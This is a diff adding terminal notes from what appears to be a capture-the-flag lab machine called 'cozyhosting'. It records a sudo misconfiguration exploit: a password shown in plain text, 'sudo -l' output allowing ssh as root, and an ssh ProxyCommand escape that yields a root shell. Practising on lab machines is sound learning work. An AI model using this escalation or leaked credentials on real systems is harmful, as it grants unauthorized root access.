@@ -1,0 +1,22 @@
+josh@cozyhosting:~$ sudo -l
+sudo -l
+[sudo] password for josh: N1NJ10WASHERE
+
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+
+L00K : https://gtfobins.github.io/gtfobins/ssh/#sudo
+
+
+josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
